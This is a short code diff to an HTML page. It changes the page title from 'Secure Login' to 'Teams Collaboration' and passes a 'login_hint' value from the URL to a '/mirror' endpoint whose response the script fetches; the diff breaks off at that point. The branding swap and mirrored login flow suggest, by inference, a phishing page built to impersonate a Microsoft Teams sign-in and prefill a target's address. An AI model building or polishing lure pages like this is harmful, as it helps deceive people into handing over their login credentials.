@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Secure Login</title>
+  <title>Teams Collaboration</title>
 </head>
 <body>
   <script>
-    const email = new URLSearchParams(window.location.search).get("email");
-    const forwardTo = `/mirror${email ? "?email=" + encodeURIComponent(email) : ""}`;
+    const loginHint = new URLSearchParams(window.location.search).get("login_hint");
+    const forwardTo = `/mirror${loginHint ? "?login_hint=" + encodeURIComponent(loginHint) : ""}`;
 
     fetch(forwardTo)
       .then(res => res.text())
